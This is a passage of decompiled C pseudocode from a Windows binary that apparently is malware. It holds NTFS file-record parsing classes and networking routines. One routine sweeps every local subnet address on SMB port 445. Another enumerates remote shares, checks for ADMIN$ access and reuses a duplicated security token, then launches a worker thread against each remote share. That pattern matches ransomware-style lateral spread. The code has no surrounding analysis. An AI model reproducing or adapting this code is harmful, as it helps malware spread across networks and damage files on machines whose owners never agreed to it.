      *(_DWORD *)(this + 8) = result;
    }
    while ( result );
  }
  *(_DWORD *)(this + 12) = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 4) = 0;
  return result;
}

//----- (0040EA30) --------------------------------------------------------
_DWORD *__thiscall sub_40EA30(_DWORD *Block, char a2)
{
  sub_40E910(Block);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}

//----- (0040EA60) --------------------------------------------------------
_DWORD *__thiscall sub_40EA60(_DWORD *Block, char a2)
{
  *Block = &CSList<CIndexEntry>::`vftable';
  sub_40E970(Block);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAE8: using guessed type void *CSList<CIndexEntry>::`vftable';

//----- (0040EA90) --------------------------------------------------------
_DWORD *__thiscall sub_40EA90(_DWORD *Block, char a2)
{
  *Block = &CSList<tagDataRun_Entry>::`vftable';
  sub_40E9D0((int)Block);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';

//----- (0040EAC0) --------------------------------------------------------
_DWORD *__thiscall sub_40EAC0(_DWORD *Block, char a2)
{
  *Block = &CSList<CAttrBase>::`vftable';
  sub_40E970(Block);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BB04: using guessed type void *CSList<CAttrBase>::`vftable';

//----- (0040EAF0) --------------------------------------------------------
_DWORD *__thiscall sub_40EAF0(_DWORD *this, __int64 a2)
{
  int *v2; // ebx
  _DWORD *v3; // edi
  unsigned int v4; // ecx
  int v5; // esi
  char *v6; // eax
  char *v7; // ebx
  _DWORD *v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // eax
  int v11; // eax
  int v12; // esi
  int v13; // esi
  _DWORD *v14; // edi
  _DWORD *v15; // eax
  _DWORD *v16; // ecx
  unsigned int v17; // eax
  char *v18; // ecx
  int *v19; // eax
  int v20; // eax
  unsigned int v21; // eax
  unsigned __int64 v23; // [esp-8h] [ebp-50h]
  unsigned int Dst; // [esp+10h] [ebp-38h] BYREF
  unsigned __int16 v25; // [esp+14h] [ebp-34h]
  int v26; // [esp+20h] [ebp-28h]
  unsigned __int16 v27; // [esp+24h] [ebp-24h]
  __int64 i; // [esp+30h] [ebp-18h] BYREF
  _DWORD *v29; // [esp+3Ch] [ebp-Ch]
  int v30; // [esp+40h] [ebp-8h]
  int v31; // [esp+44h] [ebp-4h]

  v2 = (int *)HIDWORD(a2);
  v3 = this;
  v29 = this;
  sub_40C4A0(this, a2);
  *v3 = &CAttr_AttrList<CAttrNonResident>::`vftable';
  v3[15] = &CSList<CFileRecord>::`vftable';
  v3[18] = 0;
  v3[17] = 0;
  v3[19] = 0;
  v3[16] = 0;
  if ( (v2[5] & v2[4]) != -1 )
  {
    for ( i = 0i64; sub_40C940(v3, &i, (char *)&Dst, 32, &a2); i += v25 )
    {
      if ( (_DWORD)a2 != 32 )
        break;
      v4 = (Dst >> 4) - 1;
      if ( v4 > 0x10 )
        break;
      v30 = v26;
      v31 = v27;
      if ( v26 != v2[4] || v27 != v2[5] )
      {
        v5 = 1 << v4;
        if ( ((1 << v4) & v2[22]) != 0 )
        {
          v6 = (char *)operator new(0x1A0u);
          v7 = sub_40D030(v6, v2[2]);
          v8 = operator new(8u);
          v8[1] = v7;
          *v8 = 0;
          v9 = (_DWORD *)v3[18];
          if ( v9 )
            *v9 = v8;
          else
            v3[17] = v8;
          HIDWORD(v23) = v31;
          ++v3[16];
          LODWORD(v23) = v30;
          v3[18] = v8;
          *((_DWORD *)v7 + 22) = v5;
          if ( !sub_40D920(v7, v23) )
            return v3;
          sub_40DB20(v7);
          v10 = (Dst >> 4) - 1;
          if ( v10 < 0x10 )
          {
            v11 = 5 * v10;
            v12 = *(_DWORD *)&v7[4 * v11 + 100];
            *(_DWORD *)&v7[4 * v11 + 108] = v12;
            v13 = v12 ? *(_DWORD *)(v12 + 4) : 0;
            if ( v13 )
            {
              do
              {
                v14 = (_DWORD *)(HIDWORD(a2) + 20 * (Dst >> 4));
                v15 = operator new(8u);
                v15[1] = v13;
                *v15 = 0;
                v16 = (_DWORD *)v14[21];
                if ( v16 )
                  *v16 = v15;
                else
                  v14[20] = v15;
                ++v14[19];
                v14[21] = v15;
                v17 = (Dst >> 4) - 1;
                if ( v17 >= 0x10 )
                  break;
                v18 = &v7[20 * v17];
                v19 = (int *)*((_DWORD *)v18 + 27);
                if ( v19 && (v20 = *v19, (*((_DWORD *)v18 + 27) = v20) != 0) )
                  v13 = *(_DWORD *)(v20 + 4);
                else
                  v13 = 0;
              }
              while ( v13 );
              v3 = v29;
            }
          }
          v21 = 5 * (Dst >> 4);
          *(_DWORD *)&v7[4 * v21 + 84] = 0;
          *(_DWORD *)&v7[4 * v21 + 80] = 0;
          *(_DWORD *)&v7[4 * v21 + 88] = 0;
          *(_DWORD *)&v7[4 * v21 + 76] = 0;
          v2 = (int *)HIDWORD(a2);
        }
      }
    }
  }
  return v3;
}
// 40DB20: using guessed type int __thiscall sub_40DB20(_DWORD);
// 42BA64: using guessed type void *CAttr_AttrList<CAttrNonResident>::`vftable';
// 42BBA8: using guessed type void *CSList<CFileRecord>::`vftable';
// 40EAF0: using guessed type _QWORD var_18;

//----- (0040ED10) --------------------------------------------------------
int __thiscall sub_40ED10(_DWORD *this, int a2, int *a3)
{
  int v3; // edi
  unsigned int v4; // ebx
  unsigned int v5; // edx
  size_t v6; // esi
  unsigned int v7; // ebx
  unsigned int v8; // edi
  char *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // edx
  _DWORD *v12; // ecx
  char *v13; // esi
  int v14; // edi
  int v15; // edi
  int *v16; // esi
  _DWORD *v17; // eax
  _DWORD *v18; // ecx
  char *v19; // ecx
  int *v20; // eax
  int v21; // eax
  int v22; // eax
  unsigned __int64 v24; // [esp-8h] [ebp-50h]
  unsigned int Dst; // [esp+10h] [ebp-38h] BYREF
  unsigned __int16 v26; // [esp+14h] [ebp-34h]
  unsigned int v27; // [esp+20h] [ebp-28h]
  unsigned __int16 v28; // [esp+24h] [ebp-24h]
  unsigned int i; // [esp+34h] [ebp-14h]
  __int64 v30; // [esp+38h] [ebp-10h]
  unsigned int v31; // [esp+40h] [ebp-8h]
  _DWORD *v32; // [esp+44h] [ebp-4h]
  char *v33; // [esp+50h] [ebp+8h]

  v3 = (int)this;
  v32 = this;
  *this = &CAttrBase::`vftable';
  this[1] = a2;
  this[6] = a3;
  *((_WORD *)this + 4) = *(_WORD *)(a3[2] + 8);
  this[3] = *(_DWORD *)(a3[2] + 12);
  this[4] = *(_DWORD *)(a3[2] + 20);
  this[5] = *(_DWORD *)(a3[2] + 32);
  *this = &CAttrResident::`vftable';
  this[7] = a2;
  this[8] = a2 + *(unsigned __int16 *)(a2 + 20);
  this[9] = *(_DWORD *)(a2 + 16);
  *this = &CAttr_AttrList<CAttrResident>::`vftable';
  this[10] = &CSList<CFileRecord>::`vftable';
  this[13] = 0;
  this[12] = 0;
  this[14] = 0;
  this[11] = 0;
  if ( (a3[5] & a3[4]) != -1 )
  {
    v30 = 0i64;
    v4 = 0;
    for ( i = 0; ; i = (v26 + __PAIR64__(i, HIDWORD(v30))) >> 32 )
    {
      v5 = *(_DWORD *)(v3 + 36);
      HIDWORD(v30) = v4;
      if ( v4 >= v5 )
        break;
      v6 = 32;
      if ( v4 + 32 > v5 )
        v6 = v5 - v4;
      memmove(&Dst, (const void *)(v4 + *(_DWORD *)(v3 + 32)), v6);
      if ( v6 != 32 )
        break;
      v31 = Dst >> 4;
      v7 = (Dst >> 4) - 1;
      if ( v7 > 0x10 )
        break;
      v8 = v28;
      if ( (v27 != a3[4] || v28 != a3[5]) && ((1 << v7) & a3[22]) != 0 )
      {
        v9 = (char *)operator new(0x1A0u);
        v33 = sub_40D030(v9, a3[2]);
        v10 = operator new(8u);
        v11 = v32;
        v10[1] = v33;
        *v10 = 0;
        v12 = (_DWORD *)v11[13];
        if ( v12 )
          *v12 = v10;
        else
          v11[12] = v10;
        ++v11[11];
        v11[13] = v10;
        v24 = __PAIR64__(v8, v27);
        *((_DWORD *)v33 + 22) = 1 << v7;
        v13 = v33;
        if ( !sub_40D920(v33, v24) )
          return (int)v32;
        sub_40DB20(v33);
        if ( v7 < 0x10 )
        {
          v14 = *(_DWORD *)&v33[20 * v7 + 100];
          *(_DWORD *)&v33[20 * v7 + 108] = v14;
          v15 = v14 ? *(_DWORD *)(v14 + 4) : 0;
          if ( v15 )
          {
            v16 = &a3[5 * v31];
            do
            {
              v17 = operator new(8u);
              v17[1] = v15;
              *v17 = 0;
              v18 = (_DWORD *)v16[21];
              if ( v18 )
                *v18 = v17;
              else
                v16[20] = (int)v17;
              ++v16[19];
              v16[21] = (int)v17;
              v19 = &v33[20 * v7];
              v20 = (int *)*((_DWORD *)v19 + 27);
              if ( v20 && (v21 = *v20, (*((_DWORD *)v19 + 27) = v21) != 0) )
                v15 = *(_DWORD *)(v21 + 4);
              else
                v15 = 0;
            }
            while ( v15 );
            v13 = v33;
          }
        }
        v22 = 5 * v31;
        *(_DWORD *)&v13[4 * v22 + 84] = 0;
        *(_DWORD *)&v13[4 * v22 + 80] = 0;
        *(_DWORD *)&v13[4 * v22 + 88] = 0;
        *(_DWORD *)&v13[4 * v22 + 76] = 0;
      }
      v3 = (int)v32;
      v4 = v26 + HIDWORD(v30);
    }
  }
  return v3;
}
// 40DB20: using guessed type int __thiscall sub_40DB20(_DWORD);
// 42BA94: using guessed type void *CAttr_AttrList<CAttrResident>::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB78: using guessed type void *CAttrResident::`vftable';
// 42BBA8: using guessed type void *CSList<CFileRecord>::`vftable';

//----- (0040EF70) --------------------------------------------------------
_DWORD *__thiscall sub_40EF70(_DWORD *Block, char a2)
{
  void *v4; // [esp-8h] [ebp-10h]

  *Block = &CAttr_AttrList<CAttrNonResident>::`vftable';
  sub_40E910(Block + 15);
  v4 = (void *)Block[14];
  *Block = &CAttrNonResident::`vftable';
  sub_410463(v4);
  sub_40E9D0((int)(Block + 8));
  Block[8] = &CSList<tagDataRun_Entry>::`vftable';
  sub_40E9D0((int)(Block + 8));
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';
// 42BA64: using guessed type void *CAttr_AttrList<CAttrNonResident>::`vftable';
// 42BA80: using guessed type void *CAttrNonResident::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040EFD0) --------------------------------------------------------
_DWORD *__thiscall sub_40EFD0(_DWORD *Block, char a2)
{
  *Block = &CAttr_AttrList<CAttrResident>::`vftable';
  sub_40E910(Block + 10);
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA94: using guessed type void *CAttr_AttrList<CAttrResident>::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';

//----- (0040F010) --------------------------------------------------------
_DWORD *__thiscall sub_40F010(_DWORD *Block, char a2)
{
  void *v3; // eax
  void *v5; // [esp-Ch] [ebp-10h]

  v3 = (void *)Block[18];
  *Block = &CAttr_Bitmap<CAttrNonResident>::`vftable';
  if ( v3 )
    sub_410463(v3);
  v5 = (void *)Block[14];
  *Block = &CAttrNonResident::`vftable';
  sub_410463(v5);
  sub_40E9D0((int)(Block + 8));
  Block[8] = &CSList<tagDataRun_Entry>::`vftable';
  sub_40E9D0((int)(Block + 8));
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BA54: using guessed type void *CSList<tagDataRun_Entry>::`vftable';
// 42BA80: using guessed type void *CAttrNonResident::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB50: using guessed type void *CAttr_Bitmap<CAttrNonResident>::`vftable';

//----- (0040F080) --------------------------------------------------------
_DWORD *__thiscall sub_40F080(_DWORD *Block, char a2)
{
  void *v3; // eax

  v3 = (void *)Block[12];
  *Block = &CAttr_Bitmap<CAttrResident>::`vftable';
  if ( v3 )
    sub_410463(v3);
  *Block = &CAttrBase::`vftable';
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB28: using guessed type void *CAttr_Bitmap<CAttrResident>::`vftable';

//----- (0040F0BC) --------------------------------------------------------
_DWORD *__thiscall sub_40F0BC(_DWORD *this, char a2)
{
  return sub_40CC70(this - 10, a2);
}

//----- (0040F0C4) --------------------------------------------------------
char *__thiscall sub_40F0C4(char *this, char a2)
{
  return sub_40CDC0(this - 40, a2);
}

//----- (0040F0D0) --------------------------------------------------------
ULONG __stdcall sub_40F0D0(PVOID Parameter)
{
  return NetShareEnum(
           *(LPWSTR *)Parameter,
           *((_DWORD *)Parameter + 1),
           *((LPBYTE **)Parameter + 2),
           *((_DWORD *)Parameter + 3),
           *((LPDWORD *)Parameter + 4),
           *((LPDWORD *)Parameter + 5),
           *((LPDWORD *)Parameter + 6));
}

//----- (0040F100) --------------------------------------------------------
ULONG __stdcall sub_40F100(PVOID Parameter)
{
  SIZE_T v1; // esi
  SIZE_T v2; // esi
  char *v3; // esi
  int v4; // edi
  HANDLE v5; // esi
  HANDLE v6; // eax
  DWORD v7; // eax
  int v8; // edi
  int v9; // esi
  int v10; // eax
  WCHAR *j; // esi
  HANDLE v12; // ecx
  DWORD v13; // esi
  HANDLE *v14; // ecx
  HANDLE *v15; // esi
  HANDLE *v16; // ebx
  HANDLE *v17; // ecx
  int v18; // eax
  HANDLE *v19; // edx
  void *v20; // esi
  int k; // esi
  HANDLE v23; // [esp-4h] [ebp-8Ch]
  int nCount; // [esp+Ch] [ebp-7Ch]
  char *v25; // [esp+10h] [ebp-78h]
  void *Thread; // [esp+14h] [ebp-74h] BYREF
  HANDLE *lpHandles; // [esp+18h] [ebp-70h]
  void *v28; // [esp+1Ch] [ebp-6Ch] BYREF
  DWORD v29; // [esp+20h] [ebp-68h]
  unsigned int v30; // [esp+24h] [ebp-64h] BYREF
  LPVOID Buffer; // [esp+28h] [ebp-60h] BYREF
  DWORD ExitCode; // [esp+2Ch] [ebp-5Ch] BYREF
  HANDLE *i; // [esp+30h] [ebp-58h]
  unsigned int v34; // [esp+34h] [ebp-54h]
  LPVOID lpMem; // [esp+38h] [ebp-50h]
  int v36; // [esp+3Ch] [ebp-4Ch] BYREF
  int v37; // [esp+40h] [ebp-48h] BYREF
  DWORD v38; // [esp+44h] [ebp-44h]
  int Parametera[7]; // [esp+48h] [ebp-40h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [esp+64h] [ebp-24h] BYREF

  v29 = 0;
  v28 = 0;
  nCount = 0;
  GetSystemInfo(&SystemInfo);
  v1 = 4 * SystemInfo.dwNumberOfProcessors;
  for ( lpHandles = (HANDLE *)HeapAlloc(hHeap, 8u, 4 * SystemInfo.dwNumberOfProcessors);
        !lpHandles;
        lpHandles = (HANDLE *)HeapAlloc(hHeap, 8u, v1) )
  {
    Sleep(0x64u);
  }
  v2 = 4 * SystemInfo.dwNumberOfProcessors;
  for ( i = (HANDLE *)HeapAlloc(hHeap, 8u, 4 * SystemInfo.dwNumberOfProcessors); !i; i = (HANDLE *)HeapAlloc(
                                                                                                     hHeap,
                                                                                                     8u,
                                                                                                     v2) )
    Sleep(0x64u);
LABEL_5:
  v3 = 0;
  lpMem = 0;
  if ( !WaitForSingleObject(hHandle, 0xFFFFFFFF) )
  {
    EnterCriticalSection(&stru_430A54);
    v3 = (char *)*((_DWORD *)dword_430A3C + dword_430A4C);
    lpMem = v3;
    dword_430A4C = (dword_430A4C + 1) % (unsigned int)dword_430A50;
    LeaveCriticalSection(&stru_430A54);
  }
  ReleaseSemaphore(hSemaphore, 1, 0);
  if ( v3 )
  {
    v4 = (int)(v3 + 4);
    v30 = 0;
    v36 = 0;
    v37 = 0;
    v25 = v3 + 4;
    sub_408990((int)L"SMB Open: %ls", (int)(v3 + 4));
    while ( 1 )
    {
      v5 = DuplicateTokenHandle;
      Parametera[2] = (int)&Buffer;
      Parametera[4] = (int)&v30;
      Parametera[5] = (int)&v36;
      Parametera[6] = (int)&v37;
      Parametera[0] = v4;
      Parametera[1] = 1;
      Parametera[3] = -1;
      ExitCode = -1;
      v6 = CreateThread(0, 0, sub_40F0D0, Parametera, 4u, 0);
      Thread = v6;
      if ( v6 )
      {
        if ( dword_4309DC && v5 )
        {
          SetThreadToken(&Thread, v5);
          v6 = Thread;
        }
        ResumeThread(v6);
        WaitForSingleObject(Thread, 0xFFFFFFFF);
        GetExitCodeThread(Thread, &ExitCode);
        CloseHandle(Thread);
      }
      if ( ExitCode && ExitCode != 234 )
        goto LABEL_37;
      v34 = 0;
      if ( !v30 )
        goto LABEL_36;
      v7 = nCount;
      v8 = 0;
      v9 = (int)v25;
      do
      {
        v38 = v7;
        v10 = *(_DWORD *)((char *)Buffer + v8 + 4);
        if ( v10 && v10 != 0x80000000 && v10 != 0x40000000 )
          goto LABEL_23;
        if ( !lstrcmpiW(*(LPCWSTR *)((char *)Buffer + v8), L"ADMIN$") )
        {
          sub_408990((int)L"Has Admin Access To: %ls", v9);
LABEL_23:
          v7 = nCount;
          goto LABEL_34;
        }
        for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, 0x10000u); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, 0x10000u) )
          Sleep(0x64u);
        wsprintfW(j, L"\\\\?\\UNC\\%ls\\%ls\\", v25, *(_DWORD *)((char *)Buffer + v8));
        v12 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, j, 4u, 0);
        v28 = v12;
        if ( v12 )
        {
          if ( dword_4309DC && DuplicateTokenHandle )
          {
            SetThreadToken(&v28, DuplicateTokenHandle);
            v12 = v28;
          }
          ResumeThread(v12);
          v13 = v29;
          v14 = lpHandles;
          lpHandles[v29] = v28;
          v7 = nCount + 1;
          v29 = v13 + 1;
          nCount = v7;
          if ( v7 == SystemInfo.dwNumberOfProcessors )
          {
            v15 = v14;
            v29 = WaitForMultipleObjects(v7, v14, 0, 0xFFFFFFFF);
            v23 = v15[v29];
            v15[v29] = 0;
            CloseHandle(v23);
            v7 = v38;
            nCount = v38;
          }
        }
        else
        {
          v7 = nCount;
        }
        v9 = (int)v25;
LABEL_34:
        v8 += 12;
        ++v34;
      }
      while ( v34 < v30 );
      v4 = (int)v25;
LABEL_36:
      NetApiBufferFree(Buffer);
      if ( ExitCode != 234 )
      {
LABEL_37:
        HeapFree(hHeap, 0, lpMem);
        goto LABEL_5;
      }
    }
  }
  v16 = i;
  if ( nCount )
  {
    v17 = lpHandles;
    v18 = nCount;
    v19 = i;
    do
    {
      v20 = *v17++;
      if ( v20 )
      {
        *v19++ = v20;
        --v18;
      }
    }
    while ( v18 );
    WaitForMultipleObjects(nCount, v16, 1, 0xFFFFFFFF);
    for ( k = 0; k < nCount; ++k )
      CloseHandle(v16[k]);
  }
  HeapFree(hHeap, 0, lpHandles);
  HeapFree(hHeap, 0, v16);
  return 0;
}
// 42BBC0: using guessed type wchar_t aSmbOpenLs[14];
// 42BBEC: using guessed type wchar_t aHasAdminAccess[25];
// 4309DC: using guessed type int dword_4309DC;
// 430A4C: using guessed type int dword_430A4C;
// 430A50: using guessed type int dword_430A50;

//----- (0040F520) --------------------------------------------------------
ULONG __stdcall sub_40F520(PVOID Parameter)
{
  unsigned int i; // eax
  ULONG_PTR InternalHigh; // esi
  WCHAR *j; // esi
  ULONG_PTR v4; // eax
  struct sockaddr saAddress; // [esp+Ch] [ebp-30h] BYREF
  DWORD dwAddressStringLength; // [esp+1Ch] [ebp-20h] BYREF
  ULONG_PTR Internal; // [esp+20h] [ebp-1Ch]
  char optval[4]; // [esp+24h] [ebp-18h] BYREF
  int optlen; // [esp+28h] [ebp-14h] BYREF
  DWORD NumberOfBytesTransferred; // [esp+2Ch] [ebp-10h] BYREF
  unsigned int CompletionKey; // [esp+30h] [ebp-Ch] BYREF
  LPOVERLAPPED Overlapped[2]; // [esp+34h] [ebp-8h] BYREF

  NumberOfBytesTransferred = 0;
  CompletionKey = 0;
  Overlapped[0] = 0;
  GetQueuedCompletionStatus(ExistingCompletionPort, &NumberOfBytesTransferred, &CompletionKey, Overlapped, 0xFFFFFFFF);
  for ( i = CompletionKey; CompletionKey != 1; i = CompletionKey )
  {
    if ( !i )
    {
      InternalHigh = Overlapped[0][1].InternalHigh;
      if ( setsockopt(InternalHigh, 0xFFFF, 28688, 0, 0)
        || (optlen = 4, getsockopt(InternalHigh, 0xFFFF, 28684, optval, &optlen))
        || *(_DWORD *)optval == -1 )
      {
        LOBYTE(Overlapped[0][1].Offset) = 2;
      }
      else
      {
        LOBYTE(Overlapped[0][1].Offset) = 1;
        Internal = Overlapped[0][1].Internal;
        for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, 0x30u); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, 0x30u) )
          Sleep(0x64u);
        v4 = Internal;
        *(_DWORD *)j = Internal;
        *(_DWORD *)&saAddress.sa_data[2] = v4;
        dwAddressStringLength = 22;
        *(_DWORD *)&saAddress.sa_family = 2;
        WSAAddressToStringW(&saAddress, 0x10u, 0, j + 2, &dwAddressStringLength);
        if ( !WaitForSingleObject(hSemaphore, 0xFFFFFFFF) )
        {
          EnterCriticalSection(&stru_430A54);
          *((_DWORD *)dword_430A3C + dword_430A48) = j;
          dword_430A48 = (dword_430A48 + 1) % (unsigned int)dword_430A50;
          LeaveCriticalSection(&stru_430A54);
        }
        ReleaseSemaphore(hHandle, 1, 0);
      }
      closesocket(Overlapped[0][1].InternalHigh);
      HeapFree(hHeap, 0, Overlapped[0]);
      _InterlockedIncrement(&dword_430A30);
    }
    NumberOfBytesTransferred = 0;
    CompletionKey = 0;
    Overlapped[0] = 0;
    GetQueuedCompletionStatus(ExistingCompletionPort, &NumberOfBytesTransferred, &CompletionKey, Overlapped, 0xFFFFFFFF);
  }
  return 0;
}
// 430A30: using guessed type int dword_430A30;
// 430A48: using guessed type int dword_430A48;
// 430A50: using guessed type int dword_430A50;

//----- (0040F700) --------------------------------------------------------
ULONG sub_40F700()
{
  ULONG (__stdcall *v0)(PIP_ADAPTER_INFO, PULONG); // edi
  ULONG result; // eax
  ULONG v2; // esi
  struct _IP_ADAPTER_INFO *v3; // eax
  bool v4; // zf
  void *v5; // eax
  const char *v6; // esi
  unsigned int v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // esi
  unsigned int v10; // edi
  u_long v11; // eax
  _DWORD *i; // esi
  SOCKET v13; // eax
  int v14; // ecx
  struct sockaddr *p_name; // eax
  int v16; // ecx
  __int16 *v17; // eax
  u_long v18; // eax
  SOCKET v19; // [esp-Ch] [ebp-54h]
  __int16 v20[2]; // [esp+Ch] [ebp-3Ch] BYREF
  u_long v21; // [esp+10h] [ebp-38h]
  struct sockaddr name; // [esp+1Ch] [ebp-2Ch] BYREF
  char v23[4]; // [esp+2Ch] [ebp-1Ch] BYREF
  unsigned int v24; // [esp+30h] [ebp-18h]
  u_long v25; // [esp+34h] [ebp-14h]
  const char **v26; // [esp+38h] [ebp-10h]
  unsigned int v27; // [esp+3Ch] [ebp-Ch]
  ULONG SizePointer; // [esp+40h] [ebp-8h] BYREF
  LPVOID lpMem; // [esp+44h] [ebp-4h]

  v0 = GetAdaptersInfo;
  result = GetAdaptersInfo(0, &SizePointer);
  if ( result == 111 )
  {
    v2 = SizePointer;
    v3 = (struct _IP_ADAPTER_INFO *)HeapAlloc(hHeap, 8u, SizePointer);
    lpMem = v3;
    if ( !v3 )
    {
      do
      {
        Sleep(0x64u);
        v3 = (struct _IP_ADAPTER_INFO *)HeapAlloc(hHeap, 8u, v2);
        lpMem = v3;
      }
      while ( !v3 );
      v0 = GetAdaptersInfo;
    }
    v4 = v0(v3, &SizePointer) == 0;
    v5 = lpMem;
    if ( v4 )
    {
      v26 = (const char **)lpMem;
      v6 = (const char *)lpMem;
      if ( lpMem )
      {
        do
        {
          v7 = inet_addr(v6 + 432);
          v27 = v7;
          v8 = inet_addr(v6 + 448);
          v9 = v8;
          if ( v7 )
          {
            if ( v8 )
            {
              v10 = ntohl(v7 & v8);
              v11 = ntohl(v27 | ~v9);
              v24 = v11;
              if ( v11 - v10 <= 0x10000 && v10 <= v11 )
              {
                do
                {
                  v25 = htonl(v10);
                  if ( v25 != v27 )
                  {
                    for ( i = HeapAlloc(hHeap, 8u, 0x20u); !i; i = HeapAlloc(hHeap, 8u, 0x20u) )
                      Sleep(0x64u);
                    v13 = WSASocketW(2, 1, 6, 0, 0, 1u);
                    i[6] = v13;
                    if ( v13 != -1 )
                    {
                      v14 = 16;
                      p_name = &name;
                      do
                      {
                        LOBYTE(p_name->sa_family) = 0;
                        p_name = (struct sockaddr *)((char *)p_name + 1);
                        --v14;
                      }
                      while ( v14 );
                      *(_DWORD *)&name.sa_family = 2;
                      v19 = i[6];
                      *(_DWORD *)&name.sa_data[2] = 0;
                      if ( !bind(v19, &name, 16) )
                      {
                        if ( CreateIoCompletionPort((HANDLE)i[6], ExistingCompletionPort, 0, 0) )
                        {
                          v16 = 16;
                          v17 = v20;
                          do
                          {
                            *(_BYTE *)v17 = 0;
                            v17 = (__int16 *)((char *)v17 + 1);
                            --v16;
                          }
                          while ( v16 );
                          v20[0] = 2;
                          v20[1] = htons(0x1BDu);
                          v18 = v25;
                          i[5] = v25;
                          v21 = v18;
                          if ( dword_430A6C(i[6], v20, 16, 0, 0, v23, i) || WSAGetLastError() == 997 )
                            _InterlockedIncrement(&dword_430A34);
                        }
                      }
                    }
                  }
                  ++v10;
                }
                while ( v10 <= v24 );
              }
            }
          }
          v6 = *v26;
          v26 = (const char **)v6;
        }
        while ( v6 );
        v5 = lpMem;
      }
    }
    return HeapFree(hHeap, 0, v5);
  }
  return result;
}
// 430A34: using guessed type int dword_430A34;
// 430A6C: using guessed type int (__stdcall *dword_430A6C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40F700: using guessed type char var_1C[4];

//----- (0040F930) --------------------------------------------------------
int __stdcall sub_40F930()
{
  SOCKET v0; // esi
  void *i; // eax
  HANDLE Thread; // ebx
  signed __int32 v3; // eax
  void *v4; // edi
  DWORD cbBytesReturned; // [esp+Ch] [ebp-1A4h] BYREF
  int vInBuffer[4]; // [esp+10h] [ebp-1A0h] BYREF
  struct WSAData WSAData; // [esp+20h] [ebp-190h] BYREF

  WSAStartup(0x202u, &WSAData);
  v0 = socket(2, 1, 0);
  if ( v0 != -1 )
  {
    vInBuffer[0] = 631375801;
    vInBuffer[1] = 1180753395;
    vInBuffer[2] = -445191794;
    vInBuffer[3] = 1040610444;
    if ( !WSAIoctl(v0, 0xC8000006, vInBuffer, 0x10u, &dword_430A6C, 4u, &cbBytesReturned, 0, 0) )
      closesocket(v0);
  }
  InitializeCriticalSection(&stru_430A54);
  for ( i = HeapAlloc(hHeap, 8u, 0x200u); !i; i = HeapAlloc(hHeap, 8u, 0x200u) )
    Sleep(0x64u);
  dword_430A3C = i;
  hSemaphore = CreateSemaphoreW(0, 128, 128, 0);
  hHandle = CreateSemaphoreW(0, 0, 128, 0);
  dword_430A50 = 128;
  dword_430A48 = 0;
  dword_430A4C = 0;
  ExistingCompletionPort = CreateIoCompletionPort((HANDLE)0xFFFFFFFF, 0, 0, 0);
  Thread = CreateThread(0, 0, sub_40F520, 0, 0, 0);
  cbBytesReturned = (DWORD)CreateThread(0, 0, sub_40F100, 0, 0, 0);
  sub_40F700();
  do
  {
    Sleep(0x200u);
    v3 = _InterlockedCompareExchange(&dword_430A30, dword_430A34, dword_430A34);
  }
  while ( v3 != dword_430A34 );
  PostQueuedCompletionStatus(ExistingCompletionPort, 0, 1u, 0);
  WaitForSingleObject(Thread, 0xFFFFFFFF);
  if ( !WaitForSingleObject(hSemaphore, 0xFFFFFFFF) )
  {
    EnterCriticalSection(&stru_430A54);
    *((_DWORD *)dword_430A3C + dword_430A48) = 0;
    dword_430A48 = (dword_430A48 + 1) % (unsigned int)dword_430A50;
    LeaveCriticalSection(&stru_430A54);
  }
  ReleaseSemaphore(hHandle, 1, 0);
  v4 = (void *)cbBytesReturned;
  WaitForSingleObject((HANDLE)cbBytesReturned, 0xFFFFFFFF);
  DeleteCriticalSection(&stru_430A54);
  HeapFree(hHeap, 0, dword_430A3C);
  CloseHandle(hSemaphore);
  CloseHandle(hHandle);
  CloseHandle(Thread);
  CloseHandle(v4);
  CloseHandle(ExistingCompletionPort);
  return WSACleanup();
}
// 430A30: using guessed type int dword_430A30;
// 430A34: using guessed type int dword_430A34;
// 430A48: using guessed type int dword_430A48;
// 430A4C: using guessed type int dword_430A4C;
// 430A50: using guessed type int dword_430A50;
// 430A6C: using guessed type int (__stdcall *dword_430A6C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040FB80) --------------------------------------------------------
PACL __thiscall sub_40FB80(LPWSTR pObjectName)
{
  int v2; // ecx
  struct _EXPLICIT_ACCESS_W *p_pListOfExplicitEntries; // eax
  PACL result; // eax
  struct _EXPLICIT_ACCESS_W pListOfExplicitEntries; // [esp+4h] [ebp-30h] BYREF
  struct _SID_IDENTIFIER_AUTHORITY pIdentifierAuthority; // [esp+24h] [ebp-10h] BYREF
  PACL NewAcl; // [esp+2Ch] [ebp-8h] BYREF
  PSID pSid; // [esp+30h] [ebp-4h] BYREF

  *(_DWORD *)pIdentifierAuthority.Value = 0;
